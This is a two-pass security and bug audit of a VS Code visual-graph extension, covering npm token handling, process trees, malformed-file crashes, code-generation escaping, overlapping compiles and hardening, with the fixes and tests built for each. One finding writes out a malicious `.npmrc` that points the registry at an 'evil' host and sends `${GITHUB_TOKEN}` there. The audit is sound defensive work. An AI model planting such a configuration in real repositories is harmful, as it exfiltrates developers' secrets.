# Audit: bugs and vulnerabilities

Before Release (Phase 14), November 2026. A first pass over the extension for security problems and
bugs, and the fixes, one step each. A "Built" section after each step says what it built.

## How it was checked

- **Dependencies:** `npm audit`. The extension's runtime dependencies (elkjs, web-tree-sitter) have no
  advisories. `fast-uri` has a moderate one, only through `ajv` in the tests.
- **The trust boundaries, by hand:**
  - processes;
  - workspace trust (Restricted Mode);
  - the webviews: their Content Security Policy, what they render as HTML, and the messages they send;
  - where compiling writes and removes files;
  - the npm download.
- **Lint:** typescript-eslint over `src/`, with bug-finding rules (floating promises, misused
  promises, conditions that are always true, objects turned into strings, unused code).
- **Fuzzing:**
  - 3,000 mutations of the fixture graphs, parsed and compiled in every language;
  - every code scanner timed on pathological input, to catch regexes that backtrack.

## What held up

- Every process is started with `spawn` and no shell.
- Run, Simulate, Debug, Run Tests and Test Node Library check workspace trust, and the editor's
  buttons check again.
- The webviews allow only the extension's own nonce scripts, so HTML put in them can't run script.
- Compile output is named from the graph's file name, never from its contents.
- The tar reader skips entries outside its folder and anything that isn't a file.
- Simulate stops infinite loops, and runs its debugger in a worker.
- Every scanner handled every pathological input in under 300 ms, except a deeply nested
  TypeScript generic at about 0.5 s.

## Findings

1. **A cloned repository's `.npmrc` could send environment variables to a server it names**
   (security, medium).
   - Add Blueprint Package › From npm read the workspace's `.npmrc` for the registry and its token,
     and `${VARIABLE}` in a token is read from the environment.
   - So `registry=https://evil/` with `//evil/:_authToken=${GITHUB_TOKEN}` sent that variable with the
     first search, even in Restricted Mode.
   - The token also went to whatever host the registry named for the download, and over plain http.
   - The user's own `~/.npmrc`, where private-registry tokens usually live, wasn't read.
2. **Stop, re-run and timeouts ended only the launcher** (bug, low on Windows).
   - `runCommand` killed only the process it started. Several runners are launchers whose child is
     the program: `dotnet run` for C#, `cargo run` for Rust, `py -3` for Python on Windows, and
     Godot's console executable, which starts Godot's own.
   - On Windows, killing a process leaves its children running unless the launcher ends them
     itself. Checked by starting each with a program that sleeps and killing only the launcher:
     `dotnet run` (SDK 9), `cargo run`, `py -3` and Godot 4.7's console executable all end their
     program, and so does node. `cmd /c` doesn't: its program was left running. The only `cmd /c`
     is the Maven and Gradle version check in New Project, under a 30-second timeout.
   - Not checked on macOS or Linux, where a launcher that doesn't pass the signal on to its program
     would leave it running.
   - Runs are hidden, so a program left behind went on unseen.
3. **A malformed graph file crashes the compiler** (robustness, medium).
   - `parseDocument` checks a file's outline but not the nodes, connections, pins, signatures or
     variables in it.
   - A node with no `type`, or a `null` connection (a bad merge, say), ends in a TypeError, not a
     readable error. The fuzzer found 123 distinct crashes in 19 places.
   - On save the error is unhandled: Problems isn't updated and nothing is said.
4. **Smaller ones** (low):
   - a package's `blueprint` folder wasn't checked to be inside the download, and unpacking had no
     size limit;
   - the library path the webview sends on Collapse to Function in Library isn't checked to stay
     inside the workspace folder;
   - a graph file named with `$`, `@`, `%` or `;` breaks the generated MSBuild `.targets`, and a `"`
     or `\` in a path breaks Rust's `#[path = "…"]`;
   - U+0085 in a function's description ends C#'s `///` comment;
   - a NaN or infinite literal would be written as `null` in Python;
   - unused imports and variables.

Not covered by this pass, and left for another:
- generated code in all twelve languages, beyond the conformance tests and the corpus;
- the debugger integrations, in depth;
- concurrency between compile on save, Compile and file watching;
- the webview and Codebase Map code beyond their HTML and messages.

## Steps

1. The npm registry: trust, the user's `.npmrc`, where tokens go, and limits.
2. Process trees: Stop, re-run and timeouts end the program, not just its launcher.
3. Graph files: check what's in them, with readable errors, and report a compile that fails.
4. The smaller findings, and the lint.

### Built (step 1)

- **Which `.npmrc`:** the user's (`~/.npmrc`, or `NPM_CONFIG_USERCONFIG`), then the workspace's over
  it, as npm reads them. The workspace's is read only when the workspace is trusted
  (`registryFor(name, ...npmrcs)`, blueprint-packages.ts).
- **Where a token goes** (`authorizationFor`):
  - only to URLs under its registry: the same protocol, host and port, and a path under the
    registry's;
  - only over https, or http to this computer (a local Verdaccio).
  - When the registry refuses a request the token wasn't sent with, the error says why.
- **The package:**
  - its `blueprint` folder must be inside the download (`blueprintFolder`);
  - a download may be 64 MB, and 256 MB unpacked.
- **Tests:**
  - unit (npm-registry.test.ts): the user's and the workspace's `.npmrc`, tokens kept from other
    hosts, ports, protocols and paths, http only to this computer, the Blueprint folder, and both
    size limits;
  - integration: the existing test no longer depends on the machine's `~/.npmrc`, and a new
    Restricted Mode test checks that the workspace's `.npmrc` is ignored and the user's used.
- **Docs:** node-authoring.md's npm section.

### Built (step 2)

- **Ending a run** (`killTree`, runner.ts) ends the process and everything it started:
  - on Windows with `taskkill /T /F`;
  - elsewhere by signalling its process group, since it's spawned leading one (`detached`).
  - Stop and re-run (the run's abort signal) and a run's timeout use it, so do the conformance runs'
    timeouts.
- A run aborted before it starts starts nothing.
- **Tests** (runner.test.ts): a launcher that starts a sleeping program, the way `dotnet run` does,
  ended by an abort and by a timeout; the program must end too. Both fail with the old runner. On
  Windows the test's launcher starts the program detached, because node otherwise puts it in a job
  that ends with the launcher, which would hide the bug.
- Checked on Windows only: the process group path (macOS and Linux) has no machine here.
- **The real launchers, checked afterwards** (by process ID, not by name): `dotnet run`,
  `cargo run`, `py -3`, Godot's console executable and `cmd /c`, each starting a program that sleeps
  30 seconds. Killing only the launcher left the program running under `cmd /c` alone; `killTree`
  ended the program under every launcher.

### Built (step 3)

- **What's in a graph file** (`checkDocumentContents`, src/core/document-check.ts, called by
  `parseDocument` before migrating): nodes, connections, comments, signatures and their pins,
  variables and local variables, enumerators, dispatchers, and stored function signatures.
  - Each must be an object with the fields it needs, of the right kind; a type must have an id and
    a known container; node ids must be unique in their graph.
  - The error says where: `node "p" in graph "EventGraph" has no type`.
  - A node without `position` or `properties` gets them, as in a hand-written file.
  - Version 1 files: their variables are checked before the migration reads them.
  - Every graph file in the repository passes.
- **Node properties** the compiler and the editor read without checking:
  - a node's added pins (`pins`, on Make Array, Sequence, Switch and the rest) are at most 1,000;
  - adopted element types (`wildcards`) that aren't type ids are left out;
  - a Custom Event's parameters that aren't pins are left out, and editing them writes a clean list;
  - a Reroute's type that isn't a type is ignored.
- **A compile that throws** (a compiler bug, or a generated file that can't be written) is an error
  in Compiler Results and Problems, `Compiling stopped: …`, with the stack in the output. Compile
  on save, which nobody waits for, also says it in a message.
- **Fuzzing, before and after:** the compiler, 3,000 mutations: 123 distinct crashes, then none in
  24,000 across four seeds. The editor, opening mutated files `parseDocument` accepts: one page
  error (a Custom Event parameter without a type id) in 300, then none in 1,200.
- **Tests:**
  - unit (document-check.test.ts): an error that says where for 17 kinds of breakage, filled
    defaults, every graph file in the repository, the property readers, and the fuzzer (two seeds,
    1,500 mutations each, in each file's language and another);
  - webview (malformed-files.test.ts): 120 mutated files open without a page error; it fails
    without the Custom Event fix;
  - integration: a file broken inside, saved, says where in Problems; a compile whose generated
    file is a folder says `Compiling stopped` in Problems.
- The editor fuzzer opens each file's first graph only; other graphs and editing actions on broken
  files weren't fuzzed.

### Built (step 4)

- **Collapse to Function in Library** (editor-provider.ts): the host writes only the library just
  picked for that graph, once, inside its workspace folder, and only a function library; a new
  library must be in the graph's folder. Whatever the editor's message names otherwise is ignored.
- **Paths in build files:**
  - MSBuild: a generated file's path in `vgraph.targets` gets MSBuild's escaping (`%XX` for
    `% $ @ ; ' ? *`) before XML's (`msbuildEscape`, cpp.ts). Checked with `dotnet msbuild`: files
    named `cost$x`, `at@home`, `a;b`, `100%` and `it's` are all found.
  - Rust: a path in `#[path = "…"]` is a Rust string (`rustPath`, rust.ts).
- **A function's description in a comment** (`commentLine`, compiler/names.ts, in every language):
  each run of whitespace, and U+0085, becomes one space. Each language's own hazard is escaped:
  - C#: U+0085 ended `///` (JavaScript's `\s` doesn't match it);
  - Java: `\u` escapes are decoded before comments are read, so every backslash is doubled;
  - PHP: `?>` ends PHP code even in a `//` comment, so it becomes `? >`;
  - C++: a comment ending in a backslash took the method's line into it.
  - A conformance fixture (descriptions.vgraph) has all of them, plus line breaks of every kind
    and other languages' comment and string delimiters. It passes in all 12 languages, and failed
    in C++, C#, Java and PHP before.
- **Python:** a NaN or infinite literal would be written as `float("nan")` or `float("inf")`.
  None can come from a file, since JSON has neither.
- **Lint:** the unused imports and variable are gone. Left, and why:
  - three unused names in destructuring that drop a field (`_version`, `_`, `_path`);
  - 148 conditions the types say are always true: values read from files, which aren't always
    what their types say;
  - 36 values turned into strings that the types allow to be objects: node properties, which
    are strings in practice and give `[object Object]` otherwise, not a crash;
  - the rest are deliberate: NaN checks (`x !== x`), the Function constructor that runs a
    JavaScript code node in Simulate and checks identifiers, a sparse array as a regex match's
    fallback, Simulate's thrown return signal, and promise executors that keep `resolve`.
- **Dependencies:** `npm audit fix` moved `fast-uri` (through `ajv`, tests only) to 3.1.9;
  `npm audit` finds nothing.
- **Tests:** unit (placement.test.ts) for both escapes; integration for the library save (not
  picked, outside the folder, not a function library, once); the conformance fixture.

## Status

All four steps are done. Not covered, as listed above: generated code beyond the conformance tests
and the corpus, the debugger integrations in depth, concurrency between compiles, and the webview
and Codebase Map code beyond their HTML and messages.

## Second pass

November 2026, after the first pass's four steps. What the first pass left out, and the generated
code again.

### How it was checked

- **Generated code in all twelve languages,** with two graphs compiled and run in each:
  - one prints 16 strings made to break code: quotes, backslashes, `${x}`, `#{x}`, `$x`, `{0}`,
    `%s`, `*/`, `?>`, tabs, emoji, control characters and Unicode line separators;
  - the other names about 150 variables, and a function, its input, output and local variable,
    with every language's keywords, built-ins and runtime names.
- **Everything that starts a process, runs code or writes files,** with and without workspace trust.
- **Compiles that overlap:** compile on save, Compile, renames, and other graphs of the folder.
- **The webviews' own code,** and the settings and language packs that come from the workspace.

### What held up

- Every process start is behind the trust check. New Project's version checks run in VS Code's own
  folder, not the workspace.
- A code node's code runs only in Simulate and Test Node Library, which need trust; compiling never
  runs it.
- The webviews load nothing from the network and run only the extension's scripts. The Set Up view
  escapes everything it shows.
- A workspace language pack can't replace a built-in language, and its templates only make text.
- Replace and Format String treat the text they're given as data in every language.
- The 16 strings print as they are in 11 languages, and the names compile in 10.

### Findings

1. **Overlapping compiles of a graph can leave the wrong generated file** (bug, low to medium).
   - Compile on save doesn't wait for the compile before it, so saves close together, Compile and a
     rename overlap.
   - Each compile writes its output, then removes the graph's outputs in other languages. After the
     language changes, the older compile can finish last: its file stays and the new one's goes.
   - Compiles of different graphs can likewise write a block in a build file (`lib.rs`, say) from a
     plan made before the other's.
2. **C# strings with U+0085, U+2028 or U+2029 don't build** (bug, low): C# reads them as line breaks
   in a string literal.
3. **C++ names that standard headers define as macros** (`NULL`, `EOF`, `errno`, `stdout`,
   `INT_MAX`, `M_PI`, …) don't build (bug, low).
4. **GDScript's `namespace` and `trait`** are reserved in Godot 4 but weren't renamed (bug, low).
5. **Compiling writes over a file the extension didn't generate** (bug, low). Deleting and renaming
   a graph only touch files with the "Generated by" header, but writing didn't check, and a rename
   moved outputs onto existing files. Every output name has `vgraph` in it, so it takes a clash of
   names.
6. **My Blueprint puts a function's name into HTML unescaped,** in "Local Variables (…)" (low: the
   Content Security Policy runs no script, so a crafted name can only garble the panel).
7. **Hardening** (low):
   - an output plan can write outside the workspace folder: a `Cargo.toml` naming a member crate
     outside it gets that crate's existing `vgraph_runtime.rs` rewritten, in Restricted Mode too
     (the text is fixed, and the file must be there already);
   - the `runCommands` and `runArguments` settings aren't declared restricted (they're read only to
     run, which needs trust);
   - the Set Up view's webview doesn't limit the local files it may load (its policy loads none).

Found in step 2, when the fixtures were compiled into the corpus of project layouts:

8. **A function's input or local named like a class variable hides it in C++, C#, Java and GDScript**
   (bug, medium). These languages read a member by its bare name, and a parameter or local of the
   same name hides it. A function Store with an input `value` that sets the variable `value`
   wrote `value = value;`, so the variable never changed. Java and GDScript printed the old
   value; C++ didn't build with `-Wshadow -Werror`, and C# warned (CS1717). The same went for an
   input named like a method the function calls.
9. **The linters of the corpus's projects** (low):
   - Go's staticcheck asks for control and format characters in a string to be escaped (ST1018);
   - Rust warns of a local whose first value is never read, which a graph that sets a local before
     getting it gives (`unused_assignments`).
10. **The C example pack** (examples/c-language-pack) didn't rename C23's keywords (`typeof`, …),
    its headers' macros, or `init`, which its constructor's name (`Class_init`) took (bug, low).
11. **The Codebase Map's TypeScript grammar** reads a member named `abstract` as the modifier, a
    known bug of tree-sitter-typescript 0.23.2, so the map's summary of such generated code had an
    error (low).

Not covered: the debugger integrations beyond their trust checks, the Codebase Map beyond its
messages, and ending processes on macOS and Linux.

### Steps

1. Generated files and overlapping compiles: findings 1 and 5.
2. Generated code: findings 2–4, and the two graphs as conformance fixtures; then 8–11, which
   the fixtures found.
3. Hardening: findings 6 and 7.

### Built (step 1)

- **A graph's compiles take turns** (`CompileService.compile`): one asked for while another runs
  waits for it, and all those asked for meanwhile share one compile, which reads the graph when it
  starts. So the last one asked for is the last to write.
- **A folder's build files take turns** (`OutputPlans.apply`): each plan is made and applied after
  the one before it in the folder, from the files as that one left them. Proposing a hook doesn't
  hold the turn, as it never held up the compile.
- **The user's files are never written over** (`isUsersFile`, placement.ts):
  - a compile whose files include one that's there without the "Generated by" header that names a
    graph, or a folder, writes none of them, and the error (`output-exists`) is in Problems;
  - a file generated from any graph may be written over: a renamed graph's outputs name the old
    graph until they're compiled again;
  - a shared struct's or enum's other languages are skipped the same way, one at a time;
  - a language whose generated code has no header (a workspace pack's templates may leave it out)
    can't be told from the user's, so its files are written as before;
  - a rename moves each output, unless one of the user's files is where it would go: then the old
    output is removed, and the compile after the rename says why there's no new one.
- **Tests:**
  - unit (graph-compile.test.ts): what counts as the user's file; a compile that finds one at its
    output, or at C++'s header, writes nothing and says so; a file generated from another graph is
    written over; a user's file in another language's output isn't removed;
  - integration: four compiles while the language changes leave only the latest language's file;
    renaming a graph onto a file of the user's leaves it alone, removes the old output and puts the
    error in Problems.
  - step 3's test of a compile that fails made it fail with a folder where the output goes;
    that's now the user's, so it uses a read-only generated file.

### Built (step 2)

- **C# strings** (`literal`, csharp.ts): U+0085, U+2028 and U+2029 are written as `\u` escapes.
  The rest of JSON's escapes are C#'s already.
- **C++ names** (`RESERVED`, cpp.ts): 154 macros that the standard headers generated code includes
  define, or may, are renamed like keywords: `NULL`, `EOF`, `errno`, `stdin`, `stdout`, `stderr`,
  `assert`, the limits (`INT_MAX`, `SIZE_MAX`, `DBL_EPSILON`, …), `<cmath>`'s (`INFINITY`,
  `HUGE_VAL`, `M_PI` and the rest of `M_*`, and MinGW's `DOMAIN`, `OVERFLOW`, …), the signal,
  locale and `va_*` names, and `unix`, `linux`, `i386` and `WIN32`. `min` and `max` aren't: they're
  macros only after `<windows.h>`, which generated code doesn't include.
- **GDScript names** (`RESERVED`, gdscript.ts): `namespace` and `trait`, which Godot 4 reserves.
- **Conformance fixtures** (test/fixtures/graphs), so every language keeps passing them:
  - `string-literals.vgraph` prints the 16 strings;
  - `names.vgraph` has 194 variables, and seven functions (`delete`, `init`, `main`, `NULL`,
    `namespace`, `new`, `String`) whose inputs, outputs and a local variable are named the same way.
  - Both pass in all 12 languages. Without the fixes, C# fails the first, and C++ and GDScript the
    second.
- **A method's names don't hide the class's** (`NameScope.inner`, compiler/names.ts): in C++,
  C#, Java and GDScript, a function's parameters and locals, and an interface function's stub's
  parameters, are named in a scope that holds the class's names (its variables, methods and what
  it inherits). One named like a member becomes `value_2`, as a keyword does. The other eight
  languages read members through `this`, `self`, `@` or `$this`.
- **Go strings** (`goString`, go.ts): control and format characters are written as `\u` or `\U`
  escapes, in literals and in an enum's or struct's names.
- **Rust:** `unused_assignments` joins the lints generated code allows, with `unused_variables`
  and `unused_mut`.
- **The C example pack** renames C23's keywords, the macros of the headers it includes, and `init`.
  The 16 strings showed one more: C takes `\u` only from U+00A0, so a control character in a
  string didn't build. Templates get a string's `cQuoted` form too (declarative/generator.ts),
  with control characters as octal escapes, and the pack's `literal.string` uses it.
- **TypeScript and JavaScript** rename `abstract`, as they do `static`.
- **A third fixture,** `member-names.vgraph`: Store sets the variable `value` from its input
  `value`, Relay calls Store with its input `store`, and Local returns its local `count` while the
  class's `count` stays. It passes in all 12 languages; without the fix, Java and GDScript print
  the old value three times, C++ doesn't build and C# fails too.
- **Tests:** unit (codegen.test.ts) for the C#, C++, GDScript and shadowing fixes, for where a
  language's toolchain isn't installed and its conformance run is skipped.

### Built (step 3)

- **My Blueprint** (`sectionElement`, my-blueprint.ts) puts a section's title in as text, so a
  function's name in "Local Variables (…)" can't add markup.
- **Plans stay inside the workspace folder** (`confinePlan`, core/output-plan.ts): an owned file or
  hook whose path is absolute, on another drive, or goes above the folder with `..` is left out of
  the plan, with a warning that names it. The extension's plans and the corpus's
  (`applyAcceptedPlan`) both go through it. A Cargo workspace's member crate outside the folder now
  keeps its files.
- **Settings:** `runCommands` and `runArguments` are `restrictedConfigurations`, so VS Code doesn't
  use a folder's own values for them until it's trusted. They were only read to run, which needs
  trust, so this is a second guard.
- **The Set Up view** may load no local files (`localResourceRoots: []`), as its policy loads none.
- **Docs:** output-placement.md has the principle (7).
- **Tests:**
  - unit (output-plan.test.ts): which paths are inside the folder, and the plan without the others;
    (graph-compile.test.ts) a Cargo workspace naming `../outside` leaves that crate's runtime and
    `lib.rs` alone and warns of both;
  - webview (my-blueprint.test.ts): a function named with HTML shows its name in the heading as text,
    and adds no elements;
  - Restricted Mode integration: a folder's `runCommands` and `runArguments` are ignored, while its
    `defaultLanguage` is used.

### Status

All three steps of the second pass are done. Still not covered: the debugger integrations beyond
their trust checks, the Codebase Map beyond its messages, and ending processes on macOS and Linux.
